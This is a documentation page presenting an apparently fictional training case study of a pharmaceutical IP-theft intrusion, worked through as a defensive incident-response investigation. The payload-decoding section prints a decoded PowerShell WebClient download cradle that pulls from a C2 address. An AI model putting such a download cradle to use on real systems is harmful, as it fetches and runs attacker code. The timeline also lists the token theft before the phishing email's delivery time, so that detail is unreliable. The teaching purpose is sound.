---
id: lifetech-pharma-case-study
title: "Case Study: LifeTech Pharma — Reactive Investigation"
sidebar_position: 3
description: "Complete published case study of the PROJ-2024-001 LifeTech Pharma investigation — dual entry points, DCSync, 381 MB formula exfiltration, and a 10-day Sysmon gap."
---

import Tabs from '@theme/Tabs';
import TabItem from '@theme/TabItem';

# Case Study: CTI as a Code in Practice — LifeTech Pharma

<figure>
<img src="/CTI_as_a_Code/img/lifetech/00-cover.png" alt="CTI as a Code in Practice — LifeTech Pharma cover" />
</figure>

> *A complete walkthrough of the methodology applied to a real training scenario: pharmaceutical IP theft, dual entry points, and a DCSync that changes everything.*

**Originally published on Medium:** [CTI as a Code in Practice: Reactive Investigation — LifeTech Pharma](https://medium.com/@1200km/cti-as-a-code-in-practice-reactive-investigation-lifetech-pharma-3e6574b7b85f)

:::note All scenario data is fictional
IPs, domains, company names, and individuals are invented for training. Steps 11–12 (sandbox and binary analysis) use a real Cobalt Strike sample (`1cf56da3…`, 48/75 VT detections) so those steps are reproducible against genuine malware. All other artifacts are synthetic.
:::

---

## What This Case Study Demonstrates

This article applies the full [CTI as a Code Methodology](/CTI_as_a_Code/cti-as-a-code-methodology) to a single incident from first alert through stakeholder deliverables. Every analytical decision is traceable to a log line, every claim is falsifiable, and the entire investigation lives in git.

It is the worked answer to [Assignment A01 — Reactive IR: LifeTech Pharma](/CTI_as_a_Code/training/reactive-lifetech/).

**Relevant ecosystem links:**
- [Methodology reference](/CTI_as_a_Code/cti-as-a-code-methodology) — the seven-step reactive framework used throughout
- [Full technical walkthrough](/CTI_as_a_Code/reactive-walkthrough) — step-by-step commands, queries, and outputs
- [Training assignment A01](/CTI_as_a_Code/training/reactive-lifetech/) — the student-facing brief for this scenario
- [Ecosystem overview](/CTI_as_a_Code/ecosystem) — how this case study fits into the broader CTI as a Code platform

---

## The Scenario

An Israeli mid-sized pharmaceutical company — **LifeTech Pharma** — experiences a targeted intrusion with two independent entry points.

The breach exposes **47 proprietary formula files** (~381 MB) protected under an FDA NDA. A $52 million US licensing deal is at risk of collapse.

### Dual Entry Points

| Path | Date | Target | Vector |
|---|---|---|---|
| **Path A** | Oct 22, 2024 | IT Admin (p.levi) | AiTM phishing → token replay → VPN |
| **Path B** | Nov 15, 2024 | CFO (m.cohen) | Macro-enabled Excel attachment (.xlsm) |

The CrowdStrike alert that opens the investigation is triggered by **Path B**. Path A — the actual initial access 24 days earlier — is discovered only during the evidence inventory.

---

## Step 00 — Initialize the Project Structure

Every investigation begins with the same three commands. No analysis until the folder exists.

```bash
git clone https://github.com/anpa1200/CTI_as_a_Code.git
cp -r CTI_as_a_Code/templates/reactive-case PROJ-2024-001
cd PROJ-2024-001 && git init && git add . && git commit -m "PROJ-2024-001: initialize case structure"
```

<figure>
<img src="/CTI_as_a_Code/img/lifetech/01-project-structure.png" alt="Project folder structure" />
<figcaption>The reactive case template creates a consistent, auditable folder structure before any analysis begins.</figcaption>
</figure>

<figure>
<img src="/CTI_as_a_Code/img/lifetech/02-folder-tree.png" alt="Folder tree output" />
<figcaption>The full evidence tree as seen in VS Code Explorer — every log source one click away.</figcaption>
</figure>

---

## Step 0 — Intake Process

Before touching any log, fill the intake form. It captures constraints that shape every downstream decision.

<figure>
<img src="/CTI_as_a_Code/img/lifetech/03-project-yml.png" alt="project.yml metadata form" />
<figcaption>Completed project.yml — legal hold status, notification deadlines, and evidence retention windows documented before analysis starts.</figcaption>
</figure>

Key constraints recorded in intake:
- **Legal hold** on CFO workstation — memory dump before any remediation
- **PDPA notification deadline** — 72 hours from confirmed breach
- **Evidence retention** — 90 days minimum; chain of custody required for insurance claim

**Scope — assets in scope and out of scope:**

<figure>
<img src="/CTI_as_a_Code/img/lifetech/00b-scope-in-scope.png" alt="Scope document — in-scope assets" />
<figcaption>In-scope assets: formula files on SERVER-RD-02, IT admin and CFO workstations, Azure AD, VPN gateway. The $52M licensing deal defines the crown jewels.</figcaption>
</figure>

<figure>
<img src="/CTI_as_a_Code/img/lifetech/00c-scope-out-of-scope.png" alt="Scope document — out-of-scope exclusions" />
<figcaption>Out-of-scope: production pharmacy systems and clinical trial data — legal hold constraints from the FDA prevent unrestricted forensic access.</figcaption>
</figure>

**Priority Intelligence Requirements (PIRs):**

<figure>
<img src="/CTI_as_a_Code/img/lifetech/00d-pirs.png" alt="PIRs from project.yml" />
<figcaption>Three PIRs drive the investigation: (1) scope and entry vector, (2) actor attribution, (3) what detection would have caught this. Every claim in the claims ledger maps to one PIR.</figcaption>
</figure>

**Source registry — evidence inventory with Admiralty ratings:**

<figure>
<img src="/CTI_as_a_Code/img/lifetech/00e-source-registry.png" alt="Source registry with Admiralty reliability ratings" />
<figcaption>Every evidence source rated for reliability (A–F) and credibility (1–6) before analysis. Where a source is absent from a system that should have it, the absence is recorded as a finding — not skipped.</figcaption>
</figure>

---

## Step R1.5 — Hands-On Evidence Analysis in VS Code

VS Code is the primary analysis tool. One window holds the evidence tree, formatted logs, API calls, and terminal — no context switching.

**Opening the evidence folder:**

<figure>
<img src="/CTI_as_a_Code/img/lifetech/00f-evidence-tree.png" alt="VS Code Explorer showing full evidence tree" />
<figcaption>One command opens the complete evidence directory as a VS Code workspace. Every JSON, JSONL, CSV, and syslog file is one click away — no context switching between applications.</figcaption>
</figure>

### Setup

**Install four extensions** (`Ctrl+Shift+X`):

<figure>
<img src="/CTI_as_a_Code/img/lifetech/04-vscode-extensions.png" alt="VS Code extensions installation panel" />
<figcaption>Rainbow CSV, REST Client, Hex Editor, and Prettier — the four extensions that make VS Code a complete log analysis workstation.</figcaption>
</figure>

**Key shortcuts used throughout:**

<figure>
<img src="/CTI_as_a_Code/img/lifetech/05-vscode-shortcuts.png" alt="VS Code keyboard shortcuts reference" />
<figcaption>Global search (Ctrl+Shift+F), file search (Ctrl+F), JSON outline (Ctrl+Shift+O), and RBQL console (F5) — four shortcuts that replace an entire toolchain.</figcaption>
</figure>

See the [full setup instructions and download links](/CTI_as_a_Code/reactive-walkthrough#step-r15-hands-on-evidence-analysis--vs-code-investigation) in the technical walkthrough.

---

### 1. CrowdStrike Alert — The Entry Point

The investigation opens with a CrowdStrike `Critical` detection on `WS-CFO-01`. Press `Shift+Alt+F` to format the JSON, then `Ctrl+Shift+O` to open the Outline panel.

<figure>
<img src="/CTI_as_a_Code/img/lifetech/06-crowdstrike-outline.png" alt="CrowdStrike alert outline panel" />
<figcaption>The Outline panel collapses 1,200 lines of JSON into a navigable tree — four detected behaviors visible at a glance: Execution, C2, Persistence, Credential Access.</figcaption>
</figure>

Click `prevention_policy` in the Outline:

<figure>
<img src="/CTI_as_a_Code/img/lifetech/07-prevention-policy.png" alt="Prevention policy detect-only confirmation" />
<figcaption>"prevent": false — the CFO machine is in detect-only mode. The C2 connection is live. Memory dump before anything else.</figcaption>
</figure>

:::danger Immediate action required
`"prevent": false` means the C2 beacon is still running. Collect a memory dump via CrowdStrike RTR before starting any further analysis — live memory contains decrypted C2 configuration.
:::

---

### 2. Decode the PowerShell Payload

`Ctrl+F` → `-Enc` in the formatted JSON. Copy the base64 argument, decode in the terminal:

<figure>
<img src="/CTI_as_a_Code/img/lifetech/08-base64-decode-1.png" alt="Base64 decode step 1" />
<figcaption>The encoded PowerShell command is visible in the behaviors[0].cmdline field — one Ctrl+F away from the raw JSON.</figcaption>
</figure>

<figure>
<img src="/CTI_as_a_Code/img/lifetech/09-base64-decode-2.png" alt="Base64 decode step 2 — decoded payload" />
<figcaption>Decoded output: a WebClient downloading from the C2 IP. The payload URL, User-Agent header, and destination are all visible in plaintext.</figcaption>
</figure>

```bash
echo "JABjAD0ATg..." | base64 -d | iconv -f UTF-16LE -t UTF-8
# → $c=New-Object System.Net.WebClient;$c.Headers.Add('User-Agent','Mozilla/5.0');
#   $d=$c.DownloadString('https://203.0.113.87/update')
```

**Decode locally** — never paste encoded malware into online decoders. Encoding is a common obfuscation layer; decoding reveals the real C2 endpoint.

<figure>
<img src="/CTI_as_a_Code/img/lifetech/09b-base64-output.png" alt="PowerShell base64 decoded output" />
<figcaption>Decoded output: a WebClient DownloadString call to the C2 IP. The full payload URL, User-Agent, and C2 address are visible in one terminal command — no online decoder needed.</figcaption>
</figure>

→ [Full decode procedure in the technical walkthrough](/CTI_as_a_Code/reactive-walkthrough#2-decode-the-powershell-payload)

---

### 3. M365 Message Trace — Rainbow CSV

Click `m365/message-trace-p.levi.csv` in Explorer. Rainbow CSV colorizes every column. Press `F5` for the RBQL console.

<figure>
<img src="/CTI_as_a_Code/img/lifetech/10-m365-rbql-results.png" alt="M365 RBQL results — failed auth" />
<figcaption>RBQL query: WHERE DMARC == 'fail' — the phishing email to the IT admin lands in the first result row: DMARC fail, DKIM fail, SPF fail, SCL=4, delivered.</figcaption>
</figure>

Switch to `message-trace-m.cohen.csv` for the CFO mailbox:

<figure>
<img src="/CTI_as_a_Code/img/lifetech/11-cfo-phishing-discovery.png" alt="CFO phishing email discovery" />
<figcaption>The CFO phishing delivery: .xlsm attachment, SCL=4, DMARC fail — same bypass pattern as the IT admin attack 24 days earlier. Same SCL threshold gap, different sender domain.</figcaption>
</figure>

The [ATP SCL threshold gap (INT-007)](/CTI_as_a_Code/reactive-walkthrough#3-m365-message-trace--rainbow-csv) allowed both emails to deliver. A threshold of `5` permits SCL=4 mail regardless of authentication failures.

---

### 4. Azure AD Sign-In Analysis

<figure>
<img src="/CTI_as_a_Code/img/lifetech/12-azure-ad-signin-table.png" alt="Azure AD sign-in comparison table" />
<figcaption>Four sign-in entries extracted with jq. Entry [1] (aad-signin-002) immediately stands out: Istanbul, Conditional Access notApplied, MFA null — three red flags in one row.</figcaption>
</figure>

<figure>
<img src="/CTI_as_a_Code/img/lifetech/13-suspicious-signin.png" alt="Suspicious sign-in detail — Istanbul" />
<figcaption>The anomalous sign-in: foreign city, CA policy bypassed, no MFA challenge, unknown device OS. All consistent with token replay — MFA was satisfied when the token was originally issued.</figcaption>
</figure>

The +2h17m gap between the legitimate sign-in (07:14 IST) and the replayed token (09:31 IST) is consistent with an attacker operating from a different time zone, allowing a startup delay before exploitation.

→ [Azure AD token replay detection](/CTI_as_a_Code/reactive-walkthrough#4-azure-ad-sign-in-analysis) — full jq extraction and red-flag table

---

### 5. VPN Log Analysis

<figure>
<img src="/CTI_as_a_Code/img/lifetech/14-vpn-session-output.png" alt="VPN session extraction output" />
<figcaption>Three log lines tell the full VPN story: attacker authenticates as p.levi from 185.220.101.47 (Istanbul), gets assigned 10.10.3.22 — the IT admin's own internal IP — and holds the session for 1h 12min.</figcaption>
</figure>

The internal IP assignment (`10.10.3.22`) is the key finding: all attacker activity inside the network is indistinguishable from the legitimate workstation. No per-session anomaly detection existed.

---

### 6. NGFW Log Analysis — Finding the Exfiltration

Click `palo-alto/ngfw-flows.csv`. **Start with the anomaly query — sort by bytes_sent descending:**

<figure>
<img src="/CTI_as_a_Code/img/lifetech/15-ngfw-rainbow-csv.png" alt="NGFW Rainbow CSV interface" />
<figcaption>Rainbow CSV colorizes the 41-column flow log. The LOGMAGNIFIER panel at the bottom shows the full row detail as you navigate.</figcaption>
</figure>

<figure>
<img src="/CTI_as_a_Code/img/lifetech/16-exfil-flow-discovery.png" alt="381 MB exfiltration flow highlighted" />
<figcaption>Query 1 result — the 381 MB outlier is immediately visible: 17,000× larger than the next largest flow, 99% upload ratio, 312s duration. This is the exfiltration event.</figcaption>
</figure>

<figure>
<img src="/CTI_as_a_Code/img/lifetech/06b-beacon-pattern-results.png" alt="Beacon pattern query results — two external IPs" />
<figcaption>Query 3 result: two external IPs, completely different profiles. 9 small uniform sessions (~14 KB avg) = C2 beacon. 1 giant session (399 MB) = exfiltration. No ambiguity.</figcaption>
</figure>

<figure>
<img src="/CTI_as_a_Code/img/lifetech/17-beacon-timing.png" alt="Beacon timing analysis" />
<figcaption>Query 5 — C2 beacon sessions sorted by time. The 432–452 second intervals (~7.2 minutes) are consistent across both infected hosts — same implant configuration.</figcaption>
</figure>

<figure>
<img src="/CTI_as_a_Code/img/lifetech/18-lateral-movement-flows.png" alt="Internal lateral movement flows" />
<figcaption>Query 4 — internal flows only. CFO workstation (10.10.1.45) connects to 10.10.2.20 on port 135 (DCE/RPC) then 49152 (dynamic RPC) — the WMI/DCOM lateral movement signature, 3 hours after CFO compromise.</figcaption>
</figure>

Switch to `dns-queries.csv`:

<figure>
<img src="/CTI_as_a_Code/img/lifetech/19-c2-beacon-timeline.png" alt="C2 beacon timeline per host" />
<figcaption>Query 5 — beacon timing from both infected hosts. WS-IT-LEVI began beaconing Nov 1; WS-CFO-01 joined Nov 15. Same C2 domain, same interval. Two hosts, one operator.</figcaption>
</figure>

<figure>
<img src="/CTI_as_a_Code/img/lifetech/20-dns-malware-timeline.png" alt="Full malware DNS query timeline" />
<figcaption>Query 6 — all malware-category DNS entries sorted by time. The full attack timeline is visible in DNS alone: AiTM phishing (Oct 22), C2 beaconing (Nov 1), exfil domain lookup (Nov 6), CFO phishing (Nov 15).</figcaption>
</figure>

<figure>
<img src="/CTI_as_a_Code/img/lifetech/21-per-host-beacon-count.png" alt="Per-host beacon count — two infected hosts" />
<figcaption>Query 7 — how many hosts query the C2 domain? Two: WS-IT-LEVI (6 queries) and WS-CFO-01 (3 queries). The IT admin host was the initial foothold; the CFO is the second wave 14 days later.</figcaption>
</figure>

<figure>
<img src="/CTI_as_a_Code/img/lifetech/22-attacker-recon-lookup.png" alt="Attacker recon — VPN hostname lookup" />
<figcaption>Query 8 — external IPs in DNS logs. The attacker IP (185.220.101.47) queried vpn.lifetechpharma.com one minute before the VPN login. Confirms an active human operator, not an automated tool.</figcaption>
</figure>

→ [All 8 RBQL queries with correct JavaScript syntax](/CTI_as_a_Code/reactive-walkthrough#6-ngfw-log-analysis--rainbow-csv) — no FROM clause, parseInt() not CAST(), .startsWith() not LIKE

---

### 8. Windows Security Events — DCSync

<figure>
<img src="/CTI_as_a_Code/img/lifetech/23-dcsync-events.png" alt="DCSync events extraction" />
<figcaption>Three EID 4662 events from DC01 in 18 seconds: svc_backup replicated the full domain, then krbtgt, then Administrator. Source IP: 10.10.3.22 — a workstation, not a DC. Golden ticket capability obtained.</figcaption>
</figure>

<figure>
<img src="/CTI_as_a_Code/img/lifetech/08b-server-rd02-security.png" alt="SERVER-RD-02 Windows Security events — file access and exfil connection" />
<figcaption>SERVER-RD-02 security log: 47 formula files accessed via EID 4663, followed by PowerShell EID 5156 connection to 198.51.100.44:443. Three independent sources triangulate to the same 20-second window.</figcaption>
</figure>

The DCSync gap is the starkest finding: the EID 4662 audit policy was correctly configured, the event reached Splunk, and the data was queryable — but no alert rule existed. A single SPL rule would have contained this incident before the formula exfiltration.

See [Step R4 — ATT&CK Mapping](/CTI_as_a_Code/reactive-walkthrough#step-r4-attck-mapping--where-detection-failed) for the full gap taxonomy: 7 rule-missing, 3 coverage-incomplete, 1 data-source-missing.

---

### 9. Cross-File Pivot — Four Searches, Full Attack Chain

VS Code's `Ctrl+Shift+F` searches across every open file simultaneously. Four searches navigate the complete attack chain without opening a SIEM.

<figure>
<img src="/CTI_as_a_Code/img/lifetech/24-pivot-exfil-ip.png" alt="Global search — exfil IP pivot" />
<figcaption>Ctrl+Shift+F → 198.51.100.44: four hits across four files — NGFW flow (381 MB), DNS lookup (sys-update-cdn.net resolved), SQL audit (WebClient.UploadFile command), Windows Security EID 5156 (PowerShell connection). One IP, full exfil chain.</figcaption>
</figure>

<figure>
<img src="/CTI_as_a_Code/img/lifetech/25-pivot-svc-backup.png" alt="Global search — svc_backup pivot" />
<figcaption>Ctrl+Shift+F → svc_backup: appears in DC01-security (DCSync ×3), SERVER-RD-02-security (SMB logon + file access + exfil connection), and sql-audit (full xp_cmdshell chain). One account, full lateral movement path.</figcaption>
</figure>

<figure>
<img src="/CTI_as_a_Code/img/lifetech/26-pivot-c2-domain.png" alt="Global search — C2 domain pivot" />
<figcaption>Ctrl+Shift+F → telemetry-cdn-services.biz: 11 DNS queries across two infected hosts. The domain appears only in dns-queries.csv — not in the VPN log, despite being active during the VPN session.</figcaption>
</figure>

<figure>
<img src="/CTI_as_a_Code/img/lifetech/27-pivot-attacker-ip.png" alt="Global search — attacker source IP pivot" />
<figcaption>Ctrl+Shift+F → 185.220.101.47: ties together three evidence sources — Azure AD suspicious sign-in, VPN authentication, and the pre-login VPN hostname recon in DNS. One IP, initial access chain complete.</figcaption>
</figure>

| Search term | Attack phase | Evidence sources |
|---|---|---|
| `185.220.101.47` | Initial access: AiTM, VPN, recon | azure-ad, vpn, dns-queries |
| `telemetry-cdn-services.biz` | Persistence: C2 beaconing | dns-queries (2 hosts) |
| `svc_backup` | Lateral movement + DCSync | DC01-security, SERVER-RD-02-security, sql-audit |
| `198.51.100.44` | Exfiltration | ngfw-flows, dns-queries, sql-audit, SERVER-RD-02-security |

---

## Attack Chain Summary

<figure>
<img src="/CTI_as_a_Code/img/lifetech/28-attack-chain-matrix.png" alt="Attack chain phase correlation matrix" />
<figcaption>Four IOCs map the complete attack chain: initial access through credential theft, persistence via C2, lateral movement via a compromised service account, and data exfiltration to a dedicated upload endpoint.</figcaption>
</figure>

### Full Timeline

<figure>
<img src="/CTI_as_a_Code/img/lifetech/s2-timeline-table.png" alt="Complete 18-event investigation timeline" />
<figcaption>The 18-event timeline reveals the breach started 24 days before the CrowdStrike alert. Every event carries an evidence label (CONFIRMED/CORROBORATED/INFERRED/GAP) and an ATT&CK technique ID.</figcaption>
</figure>

| Date | Event | Evidence |
|---|---|---|
| Oct 18 | `mfa-lifetechpharma.com` registered | RDAP (4 days pre-phishing) |
| Oct 22 11:23 | AiTM phishing email to p.levi (SCL=4, delivered) | M365 ATP |
| Oct 22 09:31 | IT admin visits phishing page; token stolen | Azure AD, DNS |
| Oct 22 09:31 | **GAP-001 begins** — Sysmon stops on WS-IT-LEVI | GAP-001 document |
| Oct 24 00:17 | VPN login from Istanbul as p.levi (token replay) | VPN log, Azure AD |
| Nov 1 07:14 | **GAP-001 ends** — first C2 beacon to telemetry-cdn-services.biz | DNS, NGFW |
| Nov 6 00:09 | svc_backup lateral movement to SERVER-RD-02 | Windows Security |
| Nov 6 00:13 | xp_cmdshell chain: stage → exfil → cleanup | SQL audit |
| Nov 6 00:14 | **381 MB** formula files uploaded to 198.51.100.44 | NGFW, EID 5156 |
| Nov 6 00:48 | DCSync: domain, krbtgt, Administrator | DC01 EID 4662 |
| Nov 15 15:58 | CFO phishing delivery (.xlsm, SCL=4) | M365 ATP |
| Nov 15 16:42 | CrowdStrike alert fires — CFO C2 beacon detected | CrowdStrike |

---

## ATT&CK Coverage

12 techniques mapped. The [full ATT&CK Navigator layer](https://github.com/anpa1200/CTI_as_a_Code/blob/main/investigations/lifetech-2024-11/03-analysis/attck-mapping/attck-navigator-layer.json) is available for import.

<figure>
<img src="/CTI_as_a_Code/img/lifetech/s4-attck-mapping.png" alt="ATT&CK technique mapping table" />
<figcaption>The ATT&CK mapping table from the investigation. Each row has: technique, evidence source, confidence, whether the rule fired, and the gap type. This drives the detection engineering sprint directly.</figcaption>
</figure>

<figure>
<img src="/CTI_as_a_Code/img/infographic-attack-matrix.png" alt="ATT&CK infographic" />
<figcaption>Coverage gap breakdown: 7 rule-missing (data in SIEM, no alert), 3 coverage-incomplete (partial/mis-tuned), 1 data-source-missing (WMI logging not forwarded).</figcaption>
</figure>

| Technique | Gap type | What was missing |
|---|---|---|
| T1566.001 Phishing attachment | Coverage incomplete | ATP SCL threshold at 5 instead of 3 |
| T1557 AiTM credential theft | Rule missing | No impossible-travel / token-replay alert |
| T1133 VPN with stolen credentials | Rule missing | No anomalous VPN geolocation alert |
| T1078.002 Valid account abuse | Rule missing | No service account off-hours logon alert |
| T1059.001 Encoded PowerShell | Coverage incomplete | IT admin host had Sysmon gap; CFO only detected |
| T1003.001 LSASS memory access | Rule missing | Sysmon EID 10 not alerted on |
| **T1003.006 DCSync** | **Rule missing** | **EID 4662 in SIEM — no alert rule deployed** |
| T1021.003 DCOM lateral movement | Rule missing | WmiPrvSE parent-child alert not deployed |
| T1197 BITS download | Rule missing | BITS external download not monitored |
| T1047 WMI execution | Data source missing | WMI logs not forwarded to SIEM |
| T1070.001 Event log cleared | Rule missing | wevtutil / EID 1102 alert not deployed |
| T1547.001 Registry Run Key | Coverage incomplete | EID 13 in SIEM, no alert on AppData paths |

The DCSync gap is the most consequential: **the audit policy was correct, the data was in Splunk, but no alert rule existed**. A single detection rule on EID 4662 from a non-DC IP would have fired 34 minutes before the formula exfiltration completed.

→ [Step R6 — Detection Rules](/CTI_as_a_Code/reactive-walkthrough#step-r6-detection-rules--four-that-would-have-changed-the-outcome) — the four Sigma rules that change the outcome

**Sandbox analysis** — the dropper recovered via CrowdStrike RTR is submitted to [ANY.RUN](https://app.any.run) for behavioral confirmation. Steps 11–12 of the technical walkthrough use a real Cobalt Strike beacon (`1cf56da3…`, 48/75 VT detections):

<figure>
<img src="/CTI_as_a_Code/img/lifetech/11b-sandbox-submission.png" alt="ANY.RUN sandbox submission settings" />
<figcaption>ANY.RUN submission: Windows 10 x64, Real with IDS network mode, 120-second timeout. The Cobalt Strike beacon contacts C2 within the first minute — confirming the implant is live and the C2 IP is real.</figcaption>
</figure>

---

## Key Lessons

<figure>
<img src="/CTI_as_a_Code/img/infographic-evidence-labels.png" alt="Evidence labels infographic" />
<figcaption>Evidence discipline: every claim in the claims ledger carries one of five labels — CONFIRMED, CORROBORATED, INFERRED, HYPOTHESIZED, or GAP. No unlabelled assertions.</figcaption>
</figure>

<figure>
<img src="/CTI_as_a_Code/img/infographic-gap-types.png" alt="Gap types infographic" />
<figcaption>Gap taxonomy drives remediation effort: Rule missing → sprint item. Coverage incomplete → tuning sprint. Data source missing → infrastructure project. Architectural gap → strategic initiative.</figcaption>
</figure>

**1. Evidence inventory precedes analysis.** Discovering that firewall logs have a 14-day retention window before starting the investigation determines which questions can be answered and which cannot.

**2. Gaps are findings.** The 10-day Sysmon absence on WS-IT-LEVI (GAP-001) is more suspicious than any log it would have contained. The timing — starting the moment the phishing email was opened — is itself evidence of anti-forensics (T1562.001).

**3. The alert is never the beginning.** The CrowdStrike detection on November 15 was triggered by the *second* infection. The *first* compromise happened 24 days earlier via a completely different person. Always run the evidence inventory before accepting the alert timestamp as T0.

**4. Competing hypotheses must be addressed explicitly.** "svc_backup file access could be a legitimate backup job" is ruled out with a specific reason: backup jobs run from SERVER-WSUS-01 (10.10.4.x), not WS-IT-LEVI; and the timestamp is outside the maintenance window. Not assumed away — falsified.

**5. Version control enables compliance.** The git commit hash proves what evidence existed when analysis began. This is the chain of custody for the investigation itself.

<figure>
<img src="/CTI_as_a_Code/img/lifetech/s3-claims-ledger.png" alt="Claims ledger filled example" />
<figcaption>The claims ledger converts the timeline into auditable, falsifiable assertions. Each claim answers five questions: what, evidence, confidence, competing hypotheses, which PIR. No unlabelled assertions.</figcaption>
</figure>

---

## Confidence Assessment

<figure>
<img src="/CTI_as_a_Code/img/infographic-confidence-ladder.png" alt="Confidence ladder infographic" />
<figcaption>Attribution confidence: Medium-High. TTP overlap and infrastructure match present. Independent CERT-IL deconfliction not performed — prevents elevation to High.</figcaption>
</figure>

**Attribution:** Single threat actor, dual delivery mechanism. Shared PE compile timestamp (`2018-04-09`) and shared secondary C2 domain (`sys-update-cdn.net`) across both implants are inconsistent with two independent actors. Tradecraft (AiTM + DCSync + pharmaceutical IP staging) is consistent with Iranian-nexus industrial espionage. Named cluster attribution is not warranted without CERT-IL deconfliction.

<figure>
<img src="/CTI_as_a_Code/img/lifetech/s5-attribution-table.png" alt="Attribution confidence scoring table" />
<figcaption>Attribution scored against four criteria: TTP overlap (Yes), infrastructure match (Yes), tooling match (Partial), independent confirmation (No). Result: Medium-High. The missing CERT-IL deconfliction prevents elevation to High.</figcaption>
</figure>

<figure>
<img src="/CTI_as_a_Code/img/lifetech/s7-git-history.png" alt="Completed investigation git history" />
<figcaption>The git log of a completed PROJ-2024-001 investigation. Every commit is a timestamped audit record: when each analytical step was performed, what was added, and in what order. This is the chain of custody for the investigation itself.</figcaption>
</figure>

---

## Continue Learning

| Next step | Link |
|---|---|
| Run this investigation yourself | [Assignment A01](/CTI_as_a_Code/training/reactive-lifetech/) |
| Step-by-step technical commands | [Reactive Walkthrough](/CTI_as_a_Code/reactive-walkthrough) |
| The methodology behind the steps | [CTI as a Code Methodology](/CTI_as_a_Code/cti-as-a-code-methodology) |
| Detection rules from this case | [Step R6 — Sigma Rules](/CTI_as_a_Code/reactive-walkthrough#step-r6-detection-rules--four-that-would-have-changed-the-outcome) |
| ATT&CK Navigator layer | [Download JSON](https://github.com/anpa1200/CTI_as_a_Code/blob/main/investigations/lifetech-2024-11/03-analysis/attck-mapping/attck-navigator-layer.json) |
| Related ecosystem tools | [Ecosystem Overview](/CTI_as_a_Code/ecosystem) |
| CTI Analyst Field Manual | [Evidence discipline and analytic standards](https://1200km.com/cti-analyst-field-manual/) |
| Full CTI Portfolio | [All projects, repositories, and articles](https://1200km.com/cti.html) |
